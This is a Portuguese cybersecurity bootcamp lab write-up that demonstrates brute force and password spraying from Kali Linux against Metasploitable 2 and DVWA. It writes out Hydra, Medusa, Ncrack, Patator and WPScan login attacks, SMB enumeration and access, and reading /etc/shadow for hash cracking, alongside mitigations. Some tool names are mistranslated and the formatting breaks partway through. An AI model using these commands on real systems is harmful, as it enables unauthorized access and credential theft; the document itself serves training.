# PROJETO: Simulação de Ataques de Força Bruta e Password Spraying em Ambiente Controlado com Kali Linux e Metasploitable 2

Carlos Roberto de Araujo  
Bootcamp Santander Cibersegurança - DIO  
28/10/2026

## 1. Introdução

Este projeto tem como objetivo demonstrar, em ambiente 100% controlado e ético, como funcionam ataques de força bruta, password spraying e credential stuffing.  
A simulação utiliza o Kali Linux como máquina atacante e o Metasploitable 2 como alvo vulnerável, com foco em práticas de cibersegurança defensiva e análise de riscos.

O objetivo principal é consolidar conhecimentos práticos sobre ferramentas como:
- Hydra
- Ncrack
- John the Ripper
- WPScan
- Patator
- Medusa

---

## 2. Objetivo do Projeto

O projeto foi desenvolvido para:

- Entender o funcionamento de ataques automatizados de autenticação;
- Demonstrar como credenciais fracas podem ser exploradas em ambientes vulneráveis;
- Simular cenários reais de teste de segurança em laboratório controlado;
- Identificar boas práticas de mitigação e proteção;
- Desenvolver consciência crítica sobre segurança ofensiva e defensiva.

> Importante: Este projeto deve ser executado apenas em ambientes autorizados e controlados. A utilização fora do laboratório é ilegal e antiética.

---

## 3. Tipos de Ataques Abordados

### 3.1 Força Bruta
O ataque de força bruta consiste na tentativa de diversas combinações de usuário e senha até encontrar uma válida.

Exemplo:
- Usuário: `admin`
- Senhas testadas: `123456`, `password`, `admin`, `qwerty`, etc.

### 3.2 Password Spraying
O password spraying tenta poucas senhas comuns contra muitos usuários, reduzindo o risco de bloqueio por tentativas massivas.

Exemplo:
- Usuário 1: `admin`
- Usuário 2: `administrator`
- Usuário 3: `user`
- Senha testada: `password`

### 3.3 Credential Stuffing
Esse tipo de ataque usa credenciais vazadas de outros serviços, reaproveitando combinações que já foram comprometidas em incidentes anteriores.

---

## 4. Ambiente de Laboratório

### 4.1 Topologia
O laboratório foi montado em uma rede isolada usando:

- VirtualBox
- Rede Host-Only ou NAT Network
- Kali Linux (máquina atacante)
- Metasploitable 2 (máquina vítima)

### 4.2 Endereços de Exemplo
- Kali Linux: `192.168.56.102`
- Metasploitable 2: `192.168.56.101`

### 4.3 Comandos de Descoberta
```bash
nmap -sV -p- 192.168.56.0/24
ping 192.168.56.101
4.4 Validação de Serviços
Verificar serviços expostos, como:

FTP
SSH
HTTP
SMB
Bash
nmap -sV 192.168.56.101
5. Arquivos de Usuários e Senhas
Para a simulação, foram criados arquivos com listas básicas de usuários e senhas.

5.1 users.txt
Txt
admin
administrator
msfadmin
user
guest
5.2 senhas.txt
Txt
123456
password
msfadmin
admin
12345
5.3 Criação de Wordlists
Bash
crunch 6 6 0123456789 -o senhas_numericas.txt
cewl http://192.168.56.101 -w cewl_wordlist.txt
5.4 Wordlist Padrão do Kali
O Kali Linux geralmente já inclui uma wordlist útil:

Bash
/usr/share/wordlists/rockyou.txt
Se estiver compactada:

Bash
gunzip /usr/share/wordlists/rockyou.txt.gz
6. Ferramentas Utilizadas
6.1 Hydra
Hydra é uma ferramenta extremamente versátil e compatível com diversos protocolos.

Exemplo de força bruta em FTP:

Bash
hydra -L users.txt -P senhas.txt ftp://192.168.56.101
Exemplo em login web:

Bash
hydra -L users.txt -P senhas.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^:Login failed"
6.2 Ncrack
Ncrack é otimizado para testes em redes e autenticação em serviços.

Bash
ncrack -U users.txt -P senhas.txt 192.168.56.101:22
6.3 João, o Estripador
John é utilizado para quebra de hashes e análise de credenciais.

Bash
unshadow /etc/passwd /etc/shadow > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
6.4 WPScan
WPScan é ferramenta específica para WordPress, permitindo enumeração de usuários e ataques de autenticação.

Bash
wpscan --url http://192.168.56.101/wordpress -e u
wpscan --url http://192.168.56.101/wordpress -U users.txt -P senhas.txt
6.5 Patator
Patator é flexível e modular, sendo útil para diversas autenticações.

Bash
patator ftp_login host=192.168.56.101 user=FILE0 password=FILE1 0=users.txt 1=senhas.txt
6.6 Medusa
Medusa é similar ao Hydra, sendo útil para simular múltiplas combinações.

Bash
medusa -h 192.168.56.101 -U users.txt -P senhas.txt -M ftp
7. Ataques de Força Bruta em Formulários de Login Web
Neste cenário, a máquina alvo possui o DVWA instalado no endereço:

Bash
http://192.168.56.101/dvwa
7.1 Etapas
Configurar o nível de segurança do DVWA como low;
Interceptar requisições com Burp Suite;
Observar os parâmetros do formulário;
Executar ataque com Hydra;
Utilizar wordlists customizadas geradas com cewl.
7.2 Exemplo de Ataque
Bash
hydra -L users.txt -P senhas.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
7.3 Resultado Esperado
Uma combinação como:

Txt
admin:password
pode ser encontrada em uma configuração insegura.

8. Ataque em Cadeia: Enumeração SMB e Password Spraying
8.1 Enumerando SMB
Bash
enum4linux -a 192.168.56.101
smbclient -L //192.168.56.101 -N
smbmap -H 192.168.56.101 -u guest
8.2 Pulverização por senha
Depois da enumeração, é possível listar usuários e testar uma senha comum em vários nomes.

Bash
medusa -h 192.168.56.101 -U users_enum.txt -p msfadmin -M smbnt
Esse tipo de ataque demonstra como uma senha fraca pode ser reutilizada em vários usuários, caso o ambiente não tenha controles adequados.

9. Simulando Cenário Corporativo Mal Configurado
Imagine uma empresa que não aplica bloqueio após várias tentativas falhas e que mantém compartilhamentos SMB abertos ao público.

9.1 Lista de Usuários
A partir da enumeração:

Bash
netexec smb 192.168.56.101 --users
9.2 Testando Acesso
Bash
smbclient //192.168.56.101/tmp -U msfadmin%msfadmin
Se o acesso for concedido:

Bash
ls
get arquivo.txt
Esse cenário demonstra o impacto prático de:

Confusão com Senhas;
Desconhecimento de boas práticas;
Falta de controles de acesso;
Exposição inadequada de serviços.
10. Mitigações e Boas Práticas
Para reduzir o risco de sucesso desses ataques, recomenda-se:

Uso de MFA/2FA;
Política de bloqueio após 5 tentativas inválidas;
Senhas com pelo menos 14 caracteres;
Evitar padrões e combinações óbvias;
Monitoramento com SIEM e logs de falhas;
Desativação do SMBv1;
Restringir enumeração anônima;
Proteger login web com WAF;
Limitar tentativas de autenticação em aplicações web;
Revisar permissões de compartilhamentos;
Atualizar sistemas e serviços regularmente.
10.1 Proteção do WordPress
Bash
wpscan --url http://192.168.56.101/wordpress --disable-tls-checks
Também é recomendado:

Uso de plugins de proteção;
Limitação de acessos;
Bloqueio de IPs suspeitos;
Monitoramento de logs de autenticação.
11. Aula Extra: Limitações do Medusa e Dicas Finais
O Medusa é útil, mas apresenta algumas limitações:

Menos protocolos comparado ao Hydra;
Saída mais verbosa;
Pode falhar em redes lentas por timeouts;
Necessita ajustes finos em ambientes complexos.
Dicas
Bash
medusa -h 192.168.56.101 -U users.txt -P senhas.txt -M ftp -t 1
-t 1: reduz o número de threads;
-f: interrompe ao primeiro sucesso;
-vV: habilita saída detalhada;
-o: salva a saída em arquivo.
12. Encerramento e Conclusão
Este projeto comprovou que, mesmo com ferramentas relativamente simples, credenciais fracas permitem comprometer sistemas vulneráveis em laboratórios controlados.
A importância do estudo não está em atacar, mas em compreender os métodos do atacante para fortalecer a defesa.

O aprendizado central é que:

a segurança não é apenas tecnologia;
a conscientização e a boa configuração são fundamentais;
ambientes mal configurados representam riscos reais;
a prática ética em laboratório é base para atuação profissional responsável em cibersegurança defensiva.
13. Observação Ética
Este projeto foi desenvolvido exclusivamente com fins educacionais e de laboratório.
Não deve ser utilizado para comprometer sistemas reais, redes externas ou infraestruturas sem autorização explícita do proprietário.

14. Referências e Ferramentas
Kali Linux
Metasploitável 2
Hydra
Ncrack
João, o Estripador
WPScan
Patator
Medusa
Nmap
SMBClient
Enum4Linux
Suíte do Arroto
